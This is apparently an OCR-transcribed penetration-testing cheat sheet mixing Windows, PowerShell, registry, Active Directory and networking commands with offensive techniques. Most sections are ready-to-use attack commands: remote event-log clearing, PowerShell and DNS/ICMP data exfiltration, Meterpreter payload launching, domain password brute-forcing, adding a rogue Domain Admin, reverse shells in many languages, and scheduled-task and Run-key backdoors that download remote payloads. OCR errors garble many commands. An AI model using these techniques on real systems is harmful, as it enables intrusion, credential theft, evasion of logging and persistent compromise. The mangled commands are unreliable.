********************  Linux Networking Commands  ************************
watch ss -tp                                                   #Network connections
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription EnableInvocationHeader = 1
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription OutputDirectory = “”

###Check for Powershell logs
wevtutil el
wevtutil gl "Windows Powershell"
wevtutil sl "Windows Powershell" /ms:1024000
wevtutil sl "windows Powershell" /rt:true /ab:fales
wevtutil sl "windows Powershell" /ab:false



###CLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(SVROl)
Get-EventLog -list Clear-EventLog -logname Application, Security -computername SVR01


###EXPORT OS INFO INTO CSV FILE
Get-WmiObject -class win32 operatingsjstem I select -property 1 1 exportcsv c:\os.txt


###LIST RUNNING SERVICES
Get-Service | where object {$ .status -eq "Running"}


###PERSISTENT PSDRIVE TO REMOTE FILE SHARE:
New-PSDrive -Persist -PSProvider FileSystem -Root \\1.1.1.1\tools -Name i


###RETURN FILES WITH WRITE DATE PAST 8/20
Get-Childitem -Path c:\ -Force -Recurse -Filter '.log -ErrorAction SilentlyContinue | where {$ .LastWriteTime -gt "2012-08-20"}


###FILE DOWNLOAD OVER HTTP
(new-object system.net.webclient) .downloadFile("url","dest")


###TCP PORT CONNECTION (SCANNER)
$ports=(#,#,#);$ip="x.x.x.x";foreach ($port in $ports) {try($socket=Newobject
System.Net.Sockets.TCPClient($ip,$port); }catch{};if ($socket -eq
$NULL} {echo $ip":"$port"- Closed";}else{echo $ip":"$port" - Open";$socket
= $NULL;}}


###PING WITH 500 MILLISECOND TIMEOUT
$ping = New-Object System.Net.Networkinformation.ping
$ping.Send(" ip ",55O)


###BASIC AUTHENTICATION POPUP
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
$Host.UI.PromptForCredential(" title ", " message","user" " domain")


###RUN EXE EVERY 4 HOURS BETWEEN AUG 8-11 , 2 013 AND THE HOURS OF 0800-1700 (FROM CMo. EXE)
powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match
'201308(0[8-9]|1[0-1])-(0[8-9]|1[0-7]) [ 0-5] [ 0-9]') {Start-Process -
WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400}}while(1)"


###POWERSHELL RUNAS
$pw = convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp = new-object -typename System.Management.Automation.PSCredential -
argument list "DOMAIN\user", $pw;
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command
&{Start-Process file.exe -verb runas)'


###EMAIL SENDER
powershell.exe Send-MailMessage -to " email " -from " email " -subject
"Subject" -a " attachment file path " -body "Body" -SmtpServer Target
Email Server IP


###TURN ON POWERSHELL REMOTING (WITH VALID CREDENTIALS)
net time \\ip
at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip time+1 "Powershell -Command 'Set-Item
wsman:\localhost\client\trustedhosts ''"
at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
$s1 = new-PSSession -ComputerName ip -Credential username
enter-pssession -session $s1
copy-item "C:\myRemoteData\Scripts" -Destination "C:\mylocaldata\Scripts" -fromSession $s1
remove-pssession $s1


###LIST HOSTNAME AND IP FOR ALL DOMAIN COMPUTERS
Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class
MicrosoftDNS ResourceRecord -Filter "domainname=' DOl1AIN '" | select textrepresentation


###POWERSHELL DOWNLOAD OF A FILE FROM A SPECIFIED LOCATION
powershell.exe -noprofile -noninteractive -command
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback
{$true); $source="""https:// YOUR SPECIFIED IP I file.zip """;
$destination=""" C:\rnaster.zip"""; $http = new-object Systern.Net.WebClient;
$response = $http.DownloadFile($source, $destination);"


###POWERSHELL DATA EXFIL
#Script will send a file ($filepath) via http to server ($server) via POST
#request. Must have web server listening on port designated in the $server


powershell.exe -noprofile -noninteractive -command
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback
{$true); $server="""http:// YOUR SPECIFIED IP / folder """;
$filepath=""" C:\master.zip"""; $http= new=object System.Net.WebClient;
$response = $http.UploadFile($server,$filepath);"


###USING POWERSHELL TO LAUNCH METERPRETER FROM MEMORY
#Need Metasploit v4.5+ (msfvenom supports Powershell)
#Use Powershell (x86) with 32 bit Meterpreter payloads
#encodeMeterpreter.psl script can be found on next page
--ON ATTACK BOXES--
./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.psl
Move audit.psl into same folder as encodeMeterpreter.psl
Launch Powershell(x86)
powershell.exe -executionpolicy bypass encodeMeterpreter.psl
Copy the encoded Meterpreter string
--START LISTENER ON ATTACK BOX--
./msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse https
set LHOST 1. 1. 1. 1
set LPORT 443
exploit -j
--ON TARGET (MUST USE POWERSHELL (x86))--
powershell.exe -noexit -encodedCommand paste encoded Meterpreter string here
--ENCODEMETERPRETER.PSl--
# Get Contents of Script
$contents = Get-Content audit.psl
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]::Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
$contents | ForEach-Object {$sw.WriteLine($ )}
$sw.Close()
# Base64 Encode Stream
$code = [Convert]::ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object IO. Compression. DeflateStream ('$(New-Object IO. MemoryStream
(, '$ ( [Convert]::FromBase64String ('"$code'")))) , [IO.Compression.CompressiontMode]: :Decompress)),
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"
# Invoke-Expression $command
$bytes= [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand


##USING POWERSHELL TO LAUNCH METERPRETER (2ND METHOD)
--ON ATTACK BOX--
1. msfpayload windows/meterpreter/reverse tcp LHOST=10.1.1.1
LPORT=8080 R | msfencode -t psh -a x86
--ON WINDOWS ATTACK BOX--
1. c:\ powershell
2. PS c:\ $cmd = ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE
3. PS c:\ $u = [Systern.Text.Encoding]: :Unicode.GetBytes($cmd)
4. PS c: \ $e = [Convert] ::ToBase64String($u)
5. PS c:\ $e
6. Copy contents of $e
--START LISTENER ON ATTACK BOX--
1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse tcp
4. set LHOST 1.1.1.1
5. set LPORT 8080
6. exploit -j
--ON TARGET SHELL ( 1 : DOWNLOAD SHELLCODE, 2 : EXECUTE)--
'
c:\ powershell -noprofile -noninteractive -command "&
{$client~new-object Systern.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt
', 'c:\windows\temp\ shell.txt')}"


c:\ powershell -noprofile -noninteractive -noexit -command "&
{$cmd=type 'c:\windows\temp\ shell.txt';powershell -noprofilenoninteractive
-noexit -encodedCornmand $cmd}"




********************  Windows Registry ***********************
###OS INFORMATION
HKLM\Software\Microsoft\Windows NT\CurrentVersion


###PRODUCT NAME
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName


###DATE OF INSTALL
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate


###REGISTERED OWNER
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner


###SYSTEM ROOT
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot


###TIME ZONE (OFFSET IN MINUTES FROM UTC)
HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTimeBias


###MAPPED NETWORK DRIVES
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU


###MOUNTED DEVICES
HKLM\Sjstern\MountedDevices


###USB DEVICES
HKLM\Sjstern\CurrentControlSet\Enum\USBStor


###TURN ON IP FORWARDING
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters - IPEnableRouter = 1


###PASSWORD KEYS : LSA SECRETS CAN CONTAIN VPN 1 AUTOLOGON 1 OTHER PASSWORDS
HKEY LOCAL MACHINE\Securitj\Policy\Secrets
HKCU\Soft\v~re \t1icroso ft \Windows NT\CurrentVersion \Winlogon \autoadminlogon


###AUDIT POLICY
HKLM\Security\Policy\PolAdTev


###KERNEL/USER SERVICES
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services


###INSTALLED SOFTWARE ON MACHINE
HKLM\Software


###INSTALLED SOFTWARE FOR USER
HKCU\Software


###RECENT DOCUMENTS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs


###RECENT USER LOCATIONS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite dtmu & \Opensavetmu


###TYPED URLs
HKCU\Software\Microsoft\Internet Explorer\TypedURLs


###MRU LISTS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU


###LAST REGISTRY KEY ACCESSED
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKey


###STARTUP LOCATIONS
HKLM\Software \Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows


###INTERFACE GUID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces


###IP ADDRESSES 
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\{###INTERFACE GUID###}\Parameters\Tcpip

###FIREWALL
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\sharedaccess\parameters\firewallpolicy


********************  Windows Domain ***********************
###LIST USERS ON DOMAIN WITH NO LIMIT ON RESULTS
dsquery user -limit 0


###LIST GROUPS FOR DOMAIN=VICTIM.COM
dsquery group "cn=users, dc=victim, dc=com"


###LIST DOMAIN ADMIN ACCOUNTS
dsquery group -name "domain admins" | dsget group -members -expand


###LIST ALL GROUPS FOR A USER
dsquery user -name bob | dsget user -memberof -expand


###GET A USER'S LOGIN ID
dsquery user -name bob | dsget user -samid


###LIST ACCOUNTS INACTIVE FOR 2 WEEKS
dsquery user -inactive 2


###ADD DOMAIN USER
dsadd user "CN=Bob,CN=Users,DC=victim,DC=corn" -samid bob -pwd bobpassdisplay
"Bob 11 -pwdneverexpires yes -memberof "CN=Domain Admins,CN=Users,DC=victim,DC=com"


###DELETE USER
dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"


###LIST ALL OPERATING SYSTEMS ON DOMAIN
dsquery A "DC=victim,DC=com" -scope subtree -attr "cn" "operatingSystem"
"operatingSystemServicePack" -filter " (&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows}))"


###LIST ALL SITE NAMES
dsquery site -o rdn -limit


###LIST ALL SUBNETS WITHIN A SITE
dsquery subnet -site sitename -o rdn


###LIST ALL SERVERS WITHIN A SITE
dsquery server -site sitename -o rdn


###FIND SERVERS XN THE DOMAIN
dsquery * domainroot -filter
"(&(objectCategory=Computer) (objectClass=Computer) (operatingSystem=Server))" -limit 0


###DOMAIN CONTROLLERS PER SITE
dsquery * "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
(objectCategory=Server)




********************  Windows Scripting ***********************
#If scripting in batch file, variables must be preceeded with %%, i.e. %%i
###NESTED FOR LOOP PING SWEEP
for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100
10.10.%i.%x 2 nul | find "Reply" && echo 10.10.%i.%x live.txt)


###LOOP THROUGH FILE
for /F %i in ( file ) do command


###DOMAIN BRUTE FORCER
for /F %n in (names.txt) do for /F %p in (pawds.txt) do net use \\DC01\IPC$
/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete
\\DCOl\IPC$ NUL


###ACCOUNT LOCKOUT (LOCKOUT. BAT)
@echo Test run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
1234\c$ /USER:%%U wrongpass


###DHCP EXHAUSTION
for /L %i in (2,1,254) do (netsh interface ip set address local static
1.1.1.%i netrnask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)


###DNS REVERSE LOOKUP
for /L %i in (100, 1, 105) do @ nslookup l.l.l.%i | findstr /i /c:"Name"
dns.txt && echo Server: 1.1.1.%i dns.txt


###SEARCH FOR FILES BEGINNING WITH THE WORD "PASS" AND THEN PRINT IF
IT'S A DIRECTORY, FILE DATE/TIME, RELATIVE PATH, ACTUAL PATH AND SIZE (@VARIABLES ARE OPTIONAL)
forfi1es /P c:\temp /s /m pass* -c "cmd /c echo @isdir @fdate @ftime
@relpath @path @fsize"


###SIMULATE MALICIOUS DOMAIN CALLOUTS (USEFUL FOR AV/IDS TESTING)
#Run packet capture on attack domain to receive callout
#domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1


###IE WEB LOOPER (TRAFFIC GENERATOR)
for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
ping -n 6 localhost & taskkill /F /IM iexplore.exe


###GET PERMISSIONS ON SERVICE EXECUTABLES
for /f ''tokens=2 delims='='" %a in ('wmic service list full | find /i
"pathname" | find /i /v "system32"') do @echo %a
c:\windows\temp\3afd4ga.tmp
for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
/c icacls "%a"


###ROLLING REBOOT (REPLACE /R WITH /S FOR A SHUTDOWN) :
for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
message"


###SHELL ESCALATION USING VBS (NEED ELEVATED CREDENTIALS)
# Create .vbs script with the following
Set shell ' wscript.createobject("wscript.shell")
Shell.run "runas /user: user " & """" &
C:\Windows\System32\WindowsPowershell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c \" & """" & " IEX ((New-
Object Net.WEbClient).downloadstring(' url '))\" & """" & """"
wscript.sleep (100)
shell.Sendkeys " password " & "{ENTER}"




********************  Windows Task Scheduler ***********************
#Scheduled tasks binary paths CANNOT contain spaces because everything
after the first space in the path is considered to be a command-line
argument. Enclose the /TR path parameter between backslash (\) AND
quotation marks ("):
... /TR "\"C:\Program Files\file.exe\" -x argl"


###TASK SCHEDULER (ST=START TIME, SD=START DATE, ED=END DATE) *MUST BE ADMIN
SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN\ user /RP
password


###TASK SCHEDULER PERSISTENCE [10]
*For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.0\powershell.exe"


# (x86) on User Login
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient) .downloadstring( ''http:// ip : port / payload'''))'" /SC
onlogon /RU System


# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient) .downloadstring(''http:// ip : port I payload'''))'" /SC
onstart /RU System


# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient) .downloadstring(''http:// ip : port I payload'''))'" /SC
onidle /i 30



********************  Recon  ***********************
tcpdump -nnvX -s 0 host 8.8.8.8

nc -nv 1.1.1.1 80           #banner a web page
GET / HTTP/1.0

rpcinfo -p <ip>             #unumerates linux boxes, needs apt-get install rpcbind nfs-common
rpcclient -U "" <IP>        #enum windows boxes
nmap --script smb-os-discovery.nse -p445 <IP>
nc -nv 8.8.8.8 5985
snmpwalk -c public -v1 8.8.8.8
ls /usr/share/nmap/scripts/* | grep ftp


********************  TTL Fingerprints ***********************
Windows:        128
Linux:          64
Network:        255
Solar is:       255


********************  SubNetting ***********************
/31 255.255.255.254 1 Host
/30 255.255.255.252 2 Hosts
/29 255.255.255.248 6 Hosts
/28 255.255.255.240 14 Hosts
/2" 255.255.255.224 30 Hosts
/26 255.255.255.192 62 Hosts
/25 255.255.255.128 126 Hosts
/24 255.255.255.0 254 Hosts
/23 255.255.254.0 510 Hosts
/22 255.255.252.0 1022 Hosts
/21 255.255.248.0 2046 Hosts
/20 255.255.240.0 4094 Hosts
/19 255.255.224.0 8190 Hosts
/18 255.255.192.0 16382 Hosts
/17 255.255.128.0 32?66 Hosts
/16 255.255.0.0 65534 Hosts
/15 255.254.0.0 1310"0 Hosts
/14 255.252.0.0 262142 Hosts
/13 255.248.0.0 524286 Hosts
/12 255.240.0.0 1048574 Hosts
/11 255.224.0.0 209-150 Hosts
/10 255.192.0.0 4194302 Hosts
/9 255.128.0.0 8388606 Hosts
/8 255.0.0.0 16"'"214 Hosts




********************  IPv6 Broadcast Addresses ***********************
ff02::1- link-local nodes
ff05::1- site-local nodes
ff01::2- node-local routers
ff02::2- link-local routers
ff05::2- site-local routers




********************  IPv6 Interface Addresses ***********************
fe80:: -                        link-local
2001:: -                        routable
::a.b.c.d-                      IPv4 compatible IPv6
::ffff:a.b.c.d-                 IPv4 mapped IPv6




********************  THC IPv6 ToolKit ***********************
Remote Network DoS:
rsumrf6 eth# remote ipv6




********************  SOCAT  ***********************
###SOCAT TUNNEL IPv6 THROUGH IPv4 TOOLS
socat TCP-LISTEN:8080,reuseaddr,fork TCP6: [2001: :] :80
./nikto.pl -host 127.0.0.1 -port 8080




********************  Cisco Commands  ***********************
enable                                          #Enter privilege mode
#configure terminal                             #Configure interface
(config)#interface fa0/0                        #Configure FastEthernet 0/0
(config-if)#ip addr 1.1.1.1 255.255.255.0       #Add IP to fa0/0
(config)#line Vty 0 4                           #Configure vty line
(config-line)#login                             #1. Set telnet password
(config-line)#password password                 #2. Set telnet password
#show session                                   #Open sessions
#show version                                   #IOS version
#dir file systems                               #Available files
#dir all-filesystems                            #File information
#dir /all                                       #Deleted files
#show running-config                            #Config loaded in mem
#show startup-config                            #Config loaded at boot
#show ip interface brief                        #Interfaces
#show interface eO                              #Detailed interface info
#show ip route                                  #Routes
#show access-lists                              #Access lists
#terminal length 0                              #No limit on output
#copy running-config startup-config             #Replace run w/ start config
#copy running-config tftp                       #Copy run config to TFTP Svr


CISCO IOS 11.2-12.2 VULNERABILITY
http://ip/level/16-99/exec/show/config




********************  SNMP  ***********************
###MUST START TFTP SERVER 1ST
./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt
snmpstrings.txt


###WINDOWS RUNNING SERVICES:
snmpwalk -c public -v1 ip 1 |grep hrSWRunName |cut -d" " -f4


###WINDOWS OPEN TCP PORTS :
smpwalk |grep tcpConnState |cut -d" " -f6 |sort -u


###WINDOWS INSTALLED SOFTWARE:
smpwalk |grep hrSWInstalledName


WINDOWS USERS:
snmpwalk ip 1.3 lgrep 77.1.2.25 -f4




********************  DNS ***********************
./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20            #Reverse lookup for IP range:
./dnsrecon.rb -t std -d domain.corn                     #Retrieve standard DNS records:
./dnsrecon.rb -t brt -d domain.corn -w hosts.txt        #Enumerate subdomains:
./dnsrecon -d domain.corn -t axfr                       #DNS zone transfer:


###NMAP REvERSE DNS LOOKUP AND OUTPUT PARSER
nmap -R -sL -Pn -dns-servers dns svr ip range | awk '{if( ($1" "$2"
"$3)=="Nmap scan report")print$5" "$6}' | sed 's/(//g' I sed 's/)//g' dns.txt




********************  File Transfer ***********************
###FTP THROUGH NON-INTERACTIVE SHELL
echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file ftp.txt
echo bye ftp.txt
ftp -s:ftp.txt


###DNS TRANSFER ON LINUX
On victim:
1. Hex encode the file to be transferred
xxd -p secret file.hex
2. Read in each line and do a DNS lookup
for b in 'cat file.hex '; do dig $b.shell.evilexample.com; done
On attacker:
1. Capture DNS exfil packets
tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
2. Cut the exfilled hex from the DNS packet
tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
cut -fl -d'.' | uniq received.txt
3. Reverse the hex encoding
xxd -r -p received.txt keys.pgp


###EXFIL COMMAND OUTPUT ON A LINUX MACHINE OVER ICMP
On victim (never ending l liner) :
stringZ=*cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter-0; while (($counter - ${#stringZ})};do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+16)) ;done
On attacker (capture packets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p




********************  Open Mail Relay ***********************
C:\ telnet x.x.x.x 25
HELO x.x.x.
MAIL FROM: me@you.com
RCPT TO: YOU@you.com
DATA
Thank You.
.
Quit




********************  Reverse Shells ***********************


###NETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)
nc 10.0.0.1 1234 -e /bin/sh                                #Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe                                #Windows reverse shell


###NETCAT (SOME VERSIONS DON'T SUPPORT -E OPTION)
nc -e /bin/sh 10.0.0.1 1234


###NETCAT WORK-AROUND WHEN -E OPTION NOT POSSIBLE
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 &l|nc 10.0.0.1 1234 /tmp/f


###PERL
perl -e 'use Socket; $i=:10.0.0.1”; $p=1234 socket(S,PF INET, SOCK STREAM,
getprotobjname("tcp")); if(connect(S,sockaddr in($p,inet-aton($i)))){
open(STDIN," &S") ;open(STDOUT," &S"); open (STDERR,” $S”); exec("/bin/sh -e
i" ); };'


###PERL WITHOUT /BIN/SH
perl -MIO -e ‘$p=fork; exit, if ($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444") ;STDIN- fdopen($c,r) ;$~-
fdopen($c,w) ;system$_ while  ;'


###PERL FOR WINDOWS
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,''attackerip:4444'') ;STDIN-
fdopen($c,r) ;$~- fdopen($c,w) ;system$ while ;'


###PYTHON
python -c 'import socket,subprocess, os; s=socket..socket (socket.AF _ INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call([“/bin/sh","-i"]);'


###BASH
bash -i & /dev/tcp/10.0.0.1/8080 0 &1


###JAVA
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2002;cat &5 |
while read line; do \$line 2 &5 &5; done"] as String[])
p.waitFor()


###PHP
php -r ‘$sock=fsockopen (“10.0.0.1”,1234) ;exec("/bin/sh -i &3 &3 2 &3");'


###RUBY
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234) .to i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'


###RUBY WITHOUT /BIN/ SB
by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen(cmd, “r
") { |io|c.print io.read}end'


###RUBY FOR WINDOWS
ruby -rsocket -e
'c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen{cmd,"r” ) {|
io|c.print io.read}end'


###TELNET
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
--OR--
telnet attackerip 4444 I /bin/bash I telnet attackerip 4445


###X TERM
xterm -display 10.0.0.1:1
o Start Listener: Xnest :1
o Add permission to connect: xhost +victimiP


###Misc
wget hhtp:// server /backdoor.sh -0- I sh Downloads and runs backdoor.sh




********************  Persistence ***********************


###FOR LINUX PERSISTENCE (ON ATTACK BOX)
crontab -e : set for every 10 min
0-59/10 ' ' ' ' nc ip 777 -e /bin/bash


###WINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)
sc config schedule start=auto
net start schedule
at 13:30 ''''C:\nc.exe ip 777 -e cmd.exe''''


###WINDOWS PERSISTENT BACKDOOR WITH FIREWALL BYPASS
1. REG add HKEY_CURRENT USER\Software\l1icrosoft\Windows\CurrentVersion\Run
/v firewall /t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /M0 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012


###REMoTE PAYLOAD DEPLO"!MENT VIA SMB OR WEBDAV [ 6]
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload
Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set following options:
        -localexe=true
        -localfile= payload
        -localroot= payload directory
        -disablepayloadhandler=true
3. Use psexec or wmic command to remotely execute payload


psexec \\ remote ip /u domain\compromised_user /p password "\\payload
ip \test\msf.exe"


--OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\ \ payload ip \test\msf.exe"




********************  Tunneling ***********************


###FPIPE - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
fpipe.exe -l 1234 -r 80 2.2.2.2


###SOCKS.EXE- SCAN INTRANET THROUGH SOCKS PROXY
On redirector (1.1.1.1):
socks.exe -i1.1.1.1 -p 8080


On attacker:
Modify /etc/proxychains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 12~.0.0.1 9050
Add line: socks4        1.1.1.1        8080
Scan through socks proxy:
proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2


###SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
Socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80


###STUNNEL - SSL ENCAPSULATED NC TUNNEL (WINDOWS & LINUX) [ 8]
ON attacker (client):
Modify /stunnel.conf
client. = yes
[netcat client]
accept = 5555
connect = -Listening IP-:4444


On victim (listening server)
Modify /stunnel.conf
client = no
[netcat server]
accept 4444
connect =
C:\ nc -vlp ----


On attacker (client)
# nc -nv 12-.0.C.1 5555


###NC PIVOT
cd /tmp
mknod backpipe q
nc -v -l -p 4444 0<backpipe | nc <T1IP> 80 | tee backpipe

###Dynamic SSH Socks Tunnel with proxychains
ssh /tmp/Rd.s user -Nf -D 0.0.0.0:1090
proxychains /bin/bash
